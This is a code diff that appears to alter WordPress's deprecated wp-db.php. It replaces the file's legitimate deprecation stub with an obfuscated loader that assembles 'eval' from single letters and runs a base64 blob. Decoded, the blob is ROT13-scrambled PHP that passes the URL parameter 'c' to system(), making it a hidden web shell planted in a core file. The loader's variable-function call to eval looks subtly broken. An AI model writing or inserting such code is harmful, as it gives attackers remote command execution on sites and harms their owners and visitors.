@@ -1,27 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * WordPress database access abstraction class.
- *
- * This file is deprecated, use 'wp-includes/class-wpdb.php' instead.
- *
- * @deprecated 6.1.0
- * @package WordPress
- */
-
-if ( function_exists( '_deprecated_file' ) ) {
-	// Note: WPINC may not be defined yet, so 'wp-includes' is used here.
-	_deprecated_file( basename( __FILE__ ), '6.1.0', 'wp-includes/class-wpdb.php' );
-}
-
-/** wpdb class */
-require_once __DIR__ . '/class-wpdb.php';
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogSmJlcUNlcmZmIHFuZ25vbmZyIG5wcHJmZiBub2ZnZW5wZ3ZiYSBweW5mZi4KICoKICogR3V2ZiBzdnlyIHZmIHFyY2VycG5ncnEsIGhmciAnamMtdmFweWhxcmYvcHluZmYtamNxby5jdWMnIHZhZmdybnEuCiAqCiAqIEBxcmNlcnBuZ3JxIDYuMS4wCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKi8KCnZzICggc2hhcGd2YmFfcmt2ZmdmKCAnX3FyY2VycG5ncnFfc3Z5cicgKSApIHsKCS8vIEFiZ3I6IEpDVkFQIHpubCBhYmcgb3IgcXJzdmFycSBscmcsIGZiICdqYy12YXB5aHFyZicgdmYgaGZycSB1cmVyLgoJX3FyY2VycG5ncnFfc3Z5ciggb25mcmFuenIoIF9fU1ZZUl9fICksICc2LjEuMCcsICdqYy12YXB5aHFyZi9weW5mZi1qY3FvLmN1YycgKTsKfQoKLyoqIGpjcW8gcHluZmYgKi8KZXJkaHZlcl9iYXByIF9fUVZFX18gLiAnL3B5bmZmLWpjcW8uY3VjJzsKCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
